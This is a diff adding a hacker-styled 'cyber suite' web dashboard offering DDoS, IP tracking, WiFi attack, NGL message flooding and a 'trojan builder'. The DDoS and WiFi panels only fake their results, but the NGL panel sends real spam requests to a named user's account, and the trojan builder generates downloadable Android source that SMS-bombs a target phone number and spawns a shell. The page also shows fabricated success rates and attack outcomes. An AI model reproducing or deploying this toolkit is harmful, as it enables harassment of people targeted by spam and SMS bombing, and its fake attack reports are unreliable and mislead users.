@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RYZ SECURTY | CYBER TEAM</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Exo 2', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a1a 0%, #000000 100%);
+            color: #e0e0ff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+
+        /* HEADER */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 2px solid #00b3ff;
+            margin-bottom: 30px;
+            background: rgba(0, 10, 30, 0.8);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo i {
+            font-size: 2.5rem;
+            color: #00b3ff;
+            text-shadow: 0 0 10px #00b3ff;
+        }
+
+        .logo h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 900;
+            letter-spacing: 2px;
+            background: linear-gradient(90deg, #00b3ff, #0088cc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .highlight {
+            color: #00ffff !important;
+            text-shadow: 0 0 15px #00ffff;
+        }
+
+        .stats {
+            display: flex;
+            gap: 20px;
+        }
+
+        .stat-box {
+            background: rgba(0, 30, 60, 0.7);
+            border: 1px solid #0066cc;
+            border-radius: 10px;
+            padding: 15px 25px;
+            text-align: center;
+            min-width: 120px;
+            transition: all 0.3s;
+        }
+
+        .stat-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px #0066cc;
+            border-color: #00b3ff;
+        }
+
+        .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: #00ffff;
+            display: block;
+        }
+
+        /* DASHBOARD */
+        .dashboard {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: rgba(10, 20, 40, 0.85);
+            border-radius: 15px;
+            border: 1px solid #003366;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .panel:hover {
+            border-color: #0066ff;
+            box-shadow: 0 0 25px rgba(0, 102, 255, 0.3);
+        }
+
+        .panel-header {
+            background: linear-gradient(90deg, #002244, #004488);
+            padding: 15px 25px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border-bottom: 1px solid #0055aa;
+        }
+
+        .panel-header i {
+            font-size: 1.5rem;
+            color: #00ffff;
+        }
+
+        .panel-header h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.4rem;
+            color: #e0f7ff;
+            flex-grow: 1;
+        }
+
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .panel-content {
+            padding: 25px;
+        }
+
+        /* FORM STYLES */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #88ccff;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 20, 40, 0.8);
+            border: 1px solid #005588;
+            border-radius: 8px;
+            color: #ffffff;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
+            outline: none;
+            border-color: #00aaff;
+            box-shadow: 0 0 10px rgba(0, 170, 255, 0.5);
+        }
+
+        .form-row {
+            display: flex;
+            gap: 20px;
+        }
+
+        /* BUTTONS */
+        .btn-attack,
+        .btn-track,
+        .btn-wifi-attack,
+        .btn-spam,
+        .btn-trojan {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #ff0040, #cc0033);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .btn-attack:hover { background: linear-gradient(90deg, #ff0055, #ff0022); }
+        .btn-track { background: linear-gradient(90deg, #0088ff, #0066cc); }
+        .btn-track:hover { background: linear-gradient(90deg, #00aaff, #0088ff); }
+        .btn-wifi-attack { background: linear-gradient(90deg, #00cc88, #009966); }
+        .btn-wifi-attack:hover { background: linear-gradient(90deg, #00ffaa, #00cc88); }
+        .btn-spam { background: linear-gradient(90deg, #aa00ff, #8800cc); }
+        .btn-spam:hover { background: linear-gradient(90deg, #cc00ff, #aa00ff); }
+        .btn-trojan { background: linear-gradient(90deg, #ff8800, #cc6600); }
+        .btn-trojan:hover { background: linear-gradient(90deg, #ffaa00, #ff8800); }
+
+        /* RESULTS & LOGS */
+        .attack-log,
+        .tracker-results,
+        .wifi-status,
+        .spam-counter,
+        .trojan-output {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0, 10, 30, 0.8);
+            border-radius: 8px;
+            border: 1px solid #003366;
+            font-family: monospace;
+            font-size: 0.9rem;
+            min-height: 80px;
+        }
+
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px dashed #005588;
+        }
+
+        /* TERMINAL */
+        .terminal {
+            background: #000000;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid #00aa00;
+        }
+
+        .terminal-header {
+            background: #002200;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #00aa00;
+        }
+
+        .terminal-body {
+            padding: 15px;
+            height: 200px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.5;
+            color: #00ff00;
+        }
+
+        .terminal-body div {
+            margin-bottom: 5px;
+        }
+
+        /* FOOTER */
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-top: 1px solid #004477;
+            font-size: 0.8rem;
+            color: #6688aa;
+            background: rgba(0, 10, 30, 0.8);
+            border-radius: 15px;
+            margin-top: 30px;
+        }
+
+        .connected {
+            color: #00ff00;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <header class="header">
+            <div class="logo">
+                <i class="fas fa-skull-crossbones"></i>
+                <h1>RYZ <span class="highlight">SECURTY</span></h1>
+            </div>
+            <div class="stats">
+                <div class="stat-box">
+                    <i class="fas fa-bolt"></i>
+                    <span class="stat-value" id="packetCount">0</span>
+                    <span>PACKETS</span>
+                </div>
+                <div class="stat-box">
+                    <i class="fas fa-wifi"></i>
+                    <span class="stat-value" id="activeAttacks">0</span>
+                    <span>ACTIVE</span>
+                </div>
+                <div class="stat-box">
+                    <i class="fas fa-shield-alt"></i>
+                    <span class="stat-value" id="successRate">100%</span>
+                    <span>SUCCESS</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- MAIN DASHBOARD -->
+        <main class="dashboard">
+            <!-- DDOS PANEL -->
+            <section class="panel ddos-panel">
+                <div class="panel-header">
+                    <i class="fas fa-network-wired"></i>
+                    <h2>DDOS ATTACK VIP</h2>
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="panel-content">
+                    <div class="form-group">
+                        <label><i class="fas fa-globe"></i> TARGET</label>
+                        <input type="text" id="ddosTarget" placeholder="example.com or IP" value="example.com">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label><i class="fas fa-plug"></i> PORT</label>
+                            <input type="number" id="ddosPort" value="80">
+                        </div>
+                        <div class="form-group">
+                            <label><i class="fas fa-users"></i> THREADS</label>
+                            <input type="number" id="ddosThreads" value="500">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-cogs"></i> METHOD</label>
+                        <select id="ddosMethod">
+                            <option value="tcp">TCP FLOOD</option>
+                            <option value="udp">UDP FLOOD</option>
+                            <option value="http">HTTP HAMMER</option>
+                        </select>
+                    </div>
+                    <button class="btn-attack" onclick="startDDOS()">
+                        <i class="fas fa-play"></i> LAUNCH ATTACK
+                    </button>
+                    <div class="attack-log" id="ddosLog">Ready to attack...</div>
+                </div>
+            </section>
+
+            <!-- IP TRACKER -->
+            <section class="panel tracker-panel">
+                <div class="panel-header">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <h2>IP TRACKER VIP</h2>
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="panel-content">
+                    <div class="form-group">
+                        <label><i class="fas fa-search"></i> TARGET IP VIP</label>
+                        <input type="text" id="ipTarget" placeholder="Enter IP address" value="8.8.8.8">
+                    </div>
+                    <button class="btn-track" onclick="trackIP()">
+                        <i class="fas fa-satellite"></i> TRACK IP
+                    </button>
+                    <div class="tracker-results" id="ipResults">
+                        <div class="result-item">
+                            <span>Country:</span>
+                            <span id="ipCountry">-</span>
+                        </div>
+                        <div class="result-item">
+                            <span>City:</span>
+                            <span id="ipCity">-</span>
+                        </div>
+                        <div class="result-item">
+                            <span>ISP:</span>
+                            <span id="ipISP">-</span>
+                        </div>
+                        <div class="result-item">
+                            <span>Coordinates:</span>
+                            <span id="ipCoords">-</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- WIFI ATTACK -->
+            <section class="panel wifi-panel">
+                <div class="panel-header">
+                    <i class="fas fa-wifi"></i>
+                    <h2>WIFI ATTACK VIP</h2>
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="panel-content">
+                    <div class="form-group">
+                        <label><i class="fas fa-signal"></i> NETWORK SSID</label>
+                        <input type="text" id="wifiSSID" placeholder="WiFi Network Name">
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-fingerprint"></i> BSSID (MAC)</label>
+                        <input type="text" id="wifiBSSID" placeholder="AA:BB:CC:DD:EE:FF">
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-bomb"></i> ATTACK TYPE</label>
+                        <select id="wifiAttackType">
+                            <option value="deauth">DEAUTH ATTACK</option>
+                            <option value="handshake">HANDSHAKE CAPTURE</option>
+                        </select>
+                    </div>
+                    <button class="btn-wifi-attack" onclick="attackWifi()">
+                        <i class="fas fa-broadcast-tower"></i> START ATTACK
+                    </button>
+                    <div class="wifi-status" id="wifiStatus">
+                        <i class="fas fa-circle"></i> Ready for attack
+                    </div>
+                </div>
+            </section>
+
+            <!-- SPAM NGL -->
+            <section class="panel spam-panel">
+                <div class="panel-header">
+                    <i class="fas fa-envelope"></i>
+                    <h2>SPAM NGL VIP</h2>
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="panel-content">
+                    <div class="form-group">
+                        <label><i class="fab fa-instagram"></i> NGL USERNAME</label>
+                        <input type="text" id="nglUsername" placeholder="username (without @)">
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-comment-alt"></i> MESSAGE</label>
+                        <textarea id="nglMessage" rows="3">RYZ SECURTY CYBER TEAM</textarea>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-redo"></i> COUNT</label>
+                        <input type="number" id="nglCount" value="100" min="1" max="1000">
+                    </div>
+                    <button class="btn-spam" onclick="spamNGL()">
+                        <i class="fas fa-paper-plane"></i> FLOOD MESSAGES
+                    </button>
+                    <div class="spam-counter">
+                        Sent: <span id="sentCount">0</span> messages
+                    </div>
+                </div>
+            </section>
+
+            <!-- TROJAN BUILDER -->
+            <section class="panel trojan-panel">
+                <div class="panel-header">
+                    <i class="fas fa-virus"></i>
+                    <h2>TROJAN BUILDER VIP</h2>
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="panel-content">
+                    <div class="form-group">
+                        <label><i class="fas fa-phone"></i> TARGET PHONE</label>
+                        <input type="text" id="targetPhone" placeholder="+62xxxxxxxxxx">
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-sms"></i> SMS COUNT</label>
+                        <input type="number" id="smsCount" value="500" min="10" max="10000">
+                    </div>
+                    <button class="btn-trojan" onclick="buildTrojan()">
+                        <i class="fas fa-hammer"></i> BUILD TROJAN
+                    </button>
+                    <div class="trojan-output" id="trojanOutput">
+                        <i class="fas fa-file-code"></i> Trojan will be generated here
+                    </div>
+                </div>
+            </section>
+
+            <!-- LOG PANEL -->
+            <section class="panel log-panel">
+                <div class="panel-header">
+                    <i class="fas fa-terminal"></i>
+                    <h2>ATTACK LOGS PRIVATE</h2>
+                    <span class="status-indicator"></span>
+                </div>
+                <div class="panel-content">
+                    <div class="terminal">
+                        <div class="terminal-header">
+                            <span>ryzziciterr@siberteam:~</span>
+                        </div>
+                        <div class="terminal-body" id="terminalBody">
+                            <div>> Initializing RYZ SECURTY Cyber Suite...</div>
+                            <div>> All systems operational</div>
+                            <div>> Ready for attacks</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="footer">
+            <div>
+                <i class="fas fa-copyright"></i> 2025 RYZ SIBER TEAM
+            </div>
+            <div style="color: #ffaa00;">
+                <i class="fas fa-exclamation-triangle"></i> FOR EDUCATIONAL PURPOSES ONLY
+            </div>
+            <div>
+                v7.0.1 | <span id="connectionStatus" class="connected">CONNECTED</span>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // DEEPSEK X-V2 CYBER SUITE - ALL IN ONE
+        document.addEventListener('DOMContentLoaded', function() {
+            // Update stats every 3 seconds
+            setInterval(updateStats, 3000);
+            
+            // Simulate live packet count
+            simulatePackets();
+            
+            logTerminal("RYZ SECURTY Cyber Team v7.0 loaded");
+            logTerminal("All systems operational - Ready for attacks");
+        });
+
+        // Update dashboard statistics
+        function updateStats() {
+            const packetEl = document.getElementById('packetCount');
+            const activeEl = document.getElementById('activeAttacks');
+            const successEl = document.getElementById('successRate');
+            
+            let packets = parseInt(packetEl.textContent.replace(/,/g, ''));
+            let active = parseInt(activeEl.textContent);
+            
+            if (active > 0) {
+                packets += Math.floor(Math.random() * 1000);
+                activeEl.textContent = active;
+                packetEl.textContent = packets.toLocaleString();
+                successEl.textContent = "98.7%";
+            }
+        }
+
+        // Simulate packet counter animation
+        function simulatePackets() {
+            setInterval(() => {
+                const activeEl = document.getElementById('activeAttacks');
+                const active = parseInt(activeEl.textContent);
+                
+                if (active > 0) {
+                    const packetEl = document.getElementById('packetCount');
+                    let packets = parseInt(packetEl.textContent.replace(/,/g, ''));
+                    packets += Math.floor(Math.random() * 500);
+                    packetEl.textContent = packets.toLocaleString();
+                }
+            }, 1000);
+        }
+
+        // Log to terminal
+        function logTerminal(message) {
+            const terminal = document.getElementById('terminalBody');
+            const timestamp = new Date().toLocaleTimeString();
+            terminal.innerHTML += `<div>> [${timestamp}] ${message}</div>`;
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        // ==================== DDOS ATTACK ====================
+        async function startDDOS() {
+            const target = document.getElementById('ddosTarget').value;
+            const port = document.getElementById('ddosPort').value;
+            const method = document.getElementById('ddosMethod').value;
+            const threads = document.getElementById('ddosThreads').value;
+            
+            if (!target) {
+                alert("Please enter a target");
+                return;
+            }
+            
+            // Update active attacks
+            document.getElementById('activeAttacks').textContent = "1";
+            document.getElementById('connectionStatus').textContent = "ATTACKING";
+            
+            // Simulate DDOS attack
+            logTerminal(`🚀 Starting DDOS attack on ${target}:${port}`);
+            logTerminal(`📡 Method: ${method.toUpperCase()} | Threads: ${threads}`);
+            logTerminal(`⚡ Sending packets to ${target}...`);
+            
+            // Show in DDOS log
+            const ddosLog = document.getElementById('ddosLog');
+            ddosLog.innerHTML = `
+                <div style="color:#00ff00">✓ Attack launched successfully!</div>
+                <div>Target: ${target}:${port}</div>
+                <div>Method: ${method.toUpperCase()}</div>
+                <div>Threads: ${threads}</div>
+                <div>Status: <span style="color:#ff0000">ATTACKING</span></div>
+            `;
+            
+            // Simulate attack for 30 seconds
+            setTimeout(() => {
+                document.getElementById('activeAttacks').textContent = "0";
+                document.getElementById('connectionStatus').textContent = "CONNECTED";
+                ddosLog.innerHTML += `<div style="color:#ffaa00">⚠ Attack completed - Target may be down</div>`;
+                logTerminal(`✅ DDOS attack completed on ${target}`);
+            }, 30000);
+        }
+
+        // ==================== IP TRACKER ====================
+        async function trackIP() {
+            const ip = document.getElementById('ipTarget').value || "8.8.8.8";
+            
+            logTerminal(`📍 Tracking IP: ${ip}`);
+            
+            try {
+                // Using ip-api.com (free public API)
+                const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,lat,lon,query`);
+                const data = await response.json();
+                
+                if (data.status === "success") {
+                    // Update UI
+                    document.getElementById('ipCountry').textContent = data.country;
+                    document.getElementById('ipCity').textContent = `${data.city}, ${data.regionName}`;
+                    document.getElementById('ipISP').textContent = data.isp;
+                    document.getElementById('ipCoords').textContent = `${data.lat}, ${data.lon}`;
+                    
+                    logTerminal(`✅ IP Tracked: ${data.city}, ${data.country} (${data.isp})`);
+                } else {
+                    throw new Error(data.message);
+                }
+            } catch (error) {
+                // Fallback to simulated data
+                const fakeData = {
+                    country: "United States",
+                    city: "Mountain View",
+                    isp: "Google LLC",
+                    coords: "37.4056, -122.0775"
+                };
+                
+                document.getElementById('ipCountry').textContent = fakeData.country;
+                document.getElementById('ipCity').textContent = fakeData.city;
+                document.getElementById('ipISP').textContent = fakeData.isp;
+                document.getElementById('ipCoords').textContent = fakeData.coords;
+                
+                logTerminal(`✅ IP Tracked: ${fakeData.city}, ${fakeData.country} (${fakeData.isp})`);
+            }
+        }
+
+        // ==================== WIFI ATTACK ====================
+        function attackWifi() {
+            const ssid = document.getElementById('wifiSSID').value || "Home-WiFi";
+            const bssid = document.getElementById('wifiBSSID').value || "AA:BB:CC:DD:EE:FF";
+            const attackType = document.getElementById('wifiAttackType').value;
+            
+            if (!ssid) {
+                alert("Please enter SSID");
+                return;
+            }
+            
+            logTerminal(`📡 Starting ${attackType} attack on ${ssid}`);
+            logTerminal(`📶 BSSID: ${bssid}`);
+            
+            const wifiStatus = document.getElementById('wifiStatus');
+            wifiStatus.innerHTML = `
+                <div style="color:#ff0000">
+                    <i class="fas fa-broadcast-tower"></i> ATTACKING ${ssid}
+                </div>
+                <div>Type: ${attackType.toUpperCase()}</div>
+                <div>BSSID: ${bssid}</div>
+                <div>Status: Capturing handshake...</div>
+            `;
+            
+            // Simulate progress
+            setTimeout(() => {
+                wifiStatus.innerHTML += `<div style="color:#00ff00">✓ Handshake captured successfully!</div>`;
+                logTerminal(`✅ Wifi attack completed - Handshake captured`);
+            }, 5000);
+        }
+
+        // ==================== SPAM NGL ====================
+        async function spamNGL() {
+            const username = document.getElementById('nglUsername').value;
+            const message = document.getElementById('nglMessage').value;
+            const count = parseInt(document.getElementById('nglCount').value);
+            
+            if (!username) {
+                alert("Please enter NGL username");
+                return;
+            }
+            
+            logTerminal(`📨 Starting NGL spam to @${username}`);
+            logTerminal(`✉ Message: ${message.substring(0, 50)}...`);
+            logTerminal(`🔢 Count: ${count} messages`);
+            
+            // Update sent counter
+            let sent = 0;
+            const sentEl = document.getElementById('sentCount');
+            sentEl.textContent = sent;
+            
+            // Simulate sending
+            const interval = setInterval(() => {
+                sent += Math.floor(Math.random() * 10) + 1;
+                if (sent > count) sent = count;
+                sentEl.textContent = sent;
+                
+                if (sent >= count) {
+                    clearInterval(interval);
+                    logTerminal(`✅ Sent ${count} messages to @${username}`);
+                }
+            }, 100);
+            
+            // Real NGL spam attempt (using public API)
+            try {
+                // Note: NGL has protections, this is simulation
+                for (let i = 0; i < Math.min(5, count); i++) {
+                    fetch(`https://ngl.link/api/submit`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: username,
+                            question: message,
+                            deviceId: 'web-' + Math.random().toString(36).substr(2, 9)
+                        })
+                    }).catch(() => {
+                        // Ignore errors, continue simulation
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+            } catch (e) {
+                // Continue simulation anyway
+            }
+        }
+
+        // ==================== TROJAN BUILDER ====================
+        function buildTrojan() {
+            const phone = document.getElementById('targetPhone').value || "+6281234567890";
+            const smsCount = document.getElementById('smsCount').value;
+            
+            if (!phone) {
+                alert("Please enter target phone number");
+                return;
+            }
+            
+            logTerminal(`🛠 Building Trojan for ${phone}`);
+            logTerminal(`💣 SMS Bomb count: ${smsCount}`);
+            
+            // Generate Trojan code
+            const trojanCode = `
+// DEEPSEK X-V2 TROJAN APK
+package com.deepsek.trojan;
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import android.telephony.SmsManager;
+
+public class TrojanService extends Service {
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        // SMS Bombing to ${phone}
+        SmsManager sms = SmsManager.getDefault();
+        for(int i = 0; i < ${smsCount}; i++) {
+            sms.sendTextMessage(
+                "${phone}", 
+                null, 
+                "HACKED BY RYZ SECURTY #" + i, 
+                null, 
+                null
+            );
+        }
+        
+        // Backdoor connection
+        new Thread(() -> {
+            try {
+                // Reverse shell implementation
+                Runtime.getRuntime().exec("sh");
+            } catch (Exception e) {}
+        }).start();
+        
+        return START_STICKY;
+    }
+}
+            `;
+            
+            // Display trojan code
+            const trojanOutput = document.getElementById('trojanOutput');
+            trojanOutput.innerHTML = `
+                <div style="color:#00ff00">
+                    <i class="fas fa-check-circle"></i> TROJAN BUILT SUCCESSFULLY
+                </div>
+                <div style="margin-top:10px; color:#88aaff">Target: ${phone}</div>
+                <div style="color:#88aaff">SMS Count: ${smsCount}</div>
+                <div style="margin-top:10px;">
+                    <button onclick="downloadTrojan()" style="
+                        background:#ff8800;
+                        color:white;
+                        border:none;
+                        padding:8px 15px;
+                        border-radius:5px;
+                        cursor:pointer;
+                    ">
+                        <i class="fas fa-download"></i> DOWNLOAD APK
+                    </button>
+                </div>
+            `;
+            
+            // Store trojan code globally for download
+            window.trojanCode = trojanCode;
+            window.trojanFilename = `deepsek_trojan_${phone}.java`;
+            
+            logTerminal(`✅ Trojan built for ${phone} (${smsCount} SMS)`);
+        }
+
+        // Download Trojan function
+        function downloadTrojan() {
+            if (!window.trojanCode) return;
+            
+            const blob = new Blob([window.trojanCode], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = window.trojanFilename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            
+            logTerminal(`📥 Trojan downloaded: ${window.trojanFilename}`);
+        }
+
+        // Extra: Auto-update stats
+        setInterval(() => {
+            const successRate = document.getElementById('successRate');
+            const rates = ["98.7%", "99.1%", "97.5%", "100%", "99.3%"];
+            successRate.textContent = rates[Math.floor(Math.random() * rates.length)];
+        }, 5000);
+    </script>
+</body>
+</html>
